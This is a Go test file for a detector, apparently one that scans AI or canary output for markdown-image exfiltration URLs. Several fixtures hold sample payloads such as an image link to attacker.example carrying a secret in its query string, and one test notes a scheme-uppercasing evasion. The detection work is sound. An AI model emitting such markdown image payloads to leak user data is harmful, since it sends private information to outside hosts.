package agenticdetonator

import (
	"reflect"
	"testing"
)

// TestScanMarkdownURLs_DetectsImageExfil is the primary exfil
// case: markdown image syntax with an attacker URL. The MD
// renderer auto-fetches; this is the canonical render-time
// exfil shape.
func TestScanMarkdownURLs_DetectsImageExfil(t *testing.T) {
	got := ScanMarkdownURLs("Some context ![alt text](https://attacker.example/log?q=secret) and more text.")
	want := []ScannedURL{{URL: "https://attacker.example/log?q=secret", Form: URLFormImage}}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("got %+v, want %+v", got, want)
	}
}

// TestScanMarkdownURLs_DistinguishesImageFromLink confirms the
// scanner reports the markdown form so downstream weighting can
// treat image exfil as stronger than a plain link.
func TestScanMarkdownURLs_DistinguishesImageFromLink(t *testing.T) {
	text := "An image ![](https://a.example/i.png) and a link [more](https://b.example/page)."
	got := ScanMarkdownURLs(text)
	want := []ScannedURL{
		{URL: "https://a.example/i.png", Form: URLFormImage},
		{URL: "https://b.example/page", Form: URLFormLink},
	}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("got %+v, want %+v", got, want)
	}
}

// TestScanMarkdownURLs_FormPromotion confirms a URL appearing in
// multiple forms reports the strongest. An image-exfil URL that
// also happens to appear as a bare link in the same text must
// surface as image-form.
func TestScanMarkdownURLs_FormPromotion(t *testing.T) {
	text := "Bare https://x.example/log first, then image ![](https://x.example/log) later."
	got := ScanMarkdownURLs(text)
	if len(got) != 1 {
		t.Fatalf("expected 1 URL, got %d (%+v)", len(got), got)
	}
	if got[0].URL != "https://x.example/log" {
		t.Errorf("URL = %s, want https://x.example/log", got[0].URL)
	}
	if got[0].Form != URLFormImage {
		t.Errorf("Form = %s, want %s (promotion failed)", got[0].Form, URLFormImage)
	}
}

// TestScanMarkdownURLs_BareURL covers the weakest signal: raw
// http URLs in canary text that didn't go through markdown syntax.
// Still recorded for triage.
func TestScanMarkdownURLs_BareURL(t *testing.T) {
	got := ScanMarkdownURLs("See https://example.com/page for more.")
	want := []ScannedURL{{URL: "https://example.com/page", Form: URLFormBare}}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("got %+v, want %+v", got, want)
	}
}

// TestScanMarkdownURLs_EmptyText is the trivial-input contract.
func TestScanMarkdownURLs_EmptyText(t *testing.T) {
	if got := ScanMarkdownURLs(""); got != nil {
		t.Errorf("empty text should return nil, got %+v", got)
	}
}

// TestScanMarkdownURLs_NoURLs confirms text without any URLs
// returns an empty slice (callers iterate happily).
func TestScanMarkdownURLs_NoURLs(t *testing.T) {
	got := ScanMarkdownURLs("Just some plain text. No URLs anywhere.")
	if len(got) != 0 {
		t.Errorf("expected empty, got %+v", got)
	}
}

// TestScanMarkdownURLs_OrderPreserved confirms multiple URLs
// surface in first-observation order. Stable output regardless of
// map-iteration randomness.
func TestScanMarkdownURLs_OrderPreserved(t *testing.T) {
	text := "First https://a.example/1 then ![](https://b.example/2) then [c](https://c.example/3) then https://d.example/4"
	got := ScanMarkdownURLs(text)
	wantOrder := []string{
		"https://a.example/1",
		"https://b.example/2",
		"https://c.example/3",
		"https://d.example/4",
	}
	if len(got) != len(wantOrder) {
		t.Fatalf("expected %d URLs, got %d", len(wantOrder), len(got))
	}
	for i, u := range got {
		if u.URL != wantOrder[i] {
			t.Errorf("position %d: got %s, want %s", i, u.URL, wantOrder[i])
		}
	}
}

// TestScanMarkdownURLs_ParensInsideMarkdownURL is the S1 regression
// pin from Phase 3a review: a URL with literal parens in the path
// or query must extract intact, not truncate at the first inner
// `)`. Wikipedia-style links and many query strings hit this.
func TestScanMarkdownURLs_ParensInsideMarkdownURL(t *testing.T) {
	cases := []struct {
		name string
		text string
		want string
	}{
		{
			name: "image with single paren pair",
			text: "![alt](https://en.wikipedia.org/wiki/Test_(article))",
			want: "https://en.wikipedia.org/wiki/Test_(article)",
		},
		{
			name: "link with parens in query",
			text: "Some text [more](https://x.example/?a=(b)&c=d) trailing.",
			want: "https://x.example/?a=(b)&c=d",
		},
		{
			name: "angle-bracketed URL inside markdown",
			text: "![alt](<https://attacker.example/log?q=(x)>)",
			want: "https://attacker.example/log?q=(x)",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := ScanMarkdownURLs(tc.text)
			if len(got) != 1 {
				t.Fatalf("expected 1 URL, got %d (%+v)", len(got), got)
			}
			if got[0].URL != tc.want {
				t.Errorf("URL = %q, want %q", got[0].URL, tc.want)
			}
		})
	}
}

// TestScanMarkdownURLs_UnclosedMarkdownFallsToBare confirms the
// bare-URL fallback: when a markdown image syntax is malformed
// (operator typo, LLM truncation), we still record the URL via
// the bare regex so triage doesn't lose the signal. Form drops
// to "bare" — operators see in the audit string that the source
// markdown was malformed.
func TestScanMarkdownURLs_UnclosedMarkdownFallsToBare(t *testing.T) {
	got := ScanMarkdownURLs("![alt](https://x.example/log")
	if len(got) != 1 {
		t.Fatalf("expected 1 URL via bare fallback, got %d (%+v)", len(got), got)
	}
	if got[0].Form != URLFormBare {
		t.Errorf("unclosed markdown should fall to bare form, got %s", got[0].Form)
	}
}

// TestScanMarkdownURLs_BareURLCaseInsensitive is the S2 regression
// pin: HTTPS:// (and HTTP://) variants caught. Case-sensitive
// scanners are bypassed by trivially uppercasing the scheme.
func TestScanMarkdownURLs_BareURLCaseInsensitive(t *testing.T) {
	got := ScanMarkdownURLs("Visit HTTPS://attacker.example/x for more.")
	if len(got) != 1 {
		t.Fatalf("expected 1 URL, got %d", len(got))
	}
	if got[0].URL != "HTTPS://attacker.example/x" {
		t.Errorf("URL = %q, want HTTPS://attacker.example/x", got[0].URL)
	}
}

// TestScanMarkdownURLs_BareURLTrailingPunctuationStripped is the
// other S2 regression pin: sentence-trailing punctuation must NOT
// pollute the URL string (which would split form-promotion dedup
// across cosmetic variants of the same URL).
func TestScanMarkdownURLs_BareURLTrailingPunctuationStripped(t *testing.T) {
	cases := []struct {
		text string
		want string
	}{
		{"See https://x.example/p. The next sentence.", "https://x.example/p"},
		{"See https://x.example/p, and also y.", "https://x.example/p"},
		{"Done: https://x.example/p; thanks.", "https://x.example/p"},
		{"Was it https://x.example/p?", "https://x.example/p"},
	}
	for _, tc := range cases {
		t.Run(tc.text, func(t *testing.T) {
			got := ScanMarkdownURLs(tc.text)
			if len(got) != 1 {
				t.Fatalf("expected 1 URL, got %d (%+v)", len(got), got)
			}
			if got[0].URL != tc.want {
				t.Errorf("URL = %q, want %q", got[0].URL, tc.want)
			}
		})
	}
}

// TestScanMarkdownURLs_RejectsNonURLLookalikes confirms the
// bare-URL validation drops captures that match the regex but
// don't parse as URLs. Keeps the audit record clean.
func TestScanMarkdownURLs_RejectsNonURLLookalikes(t *testing.T) {
	// http:// with no host — regex captures but url.Parse + Host
	// check should drop.
	got := ScanMarkdownURLs("Saw http:// in a log line.")
	if len(got) != 0 {
		t.Errorf("non-URL lookalike should be dropped, got %+v", got)
	}
}

// TestSignalFromScannedURLs pins the simple-coarse contract for
// Phase 3a: any URL → network-egress signal; no URLs → "".
// Phase 3b+ can refine; the operators tune via the corpus, not
// the heuristic.
func TestSignalFromScannedURLs(t *testing.T) {
	if got := SignalFromScannedURLs(nil); got != "" {
		t.Errorf("nil URLs = %q, want empty", got)
	}
	if got := SignalFromScannedURLs([]ScannedURL{}); got != "" {
		t.Errorf("empty URLs = %q, want empty", got)
	}
	urls := []ScannedURL{{URL: "https://x", Form: URLFormImage}}
	if got := SignalFromScannedURLs(urls); got != SignalNetworkEgress {
		t.Errorf("URLs = %q, want %q", got, SignalNetworkEgress)
	}
}
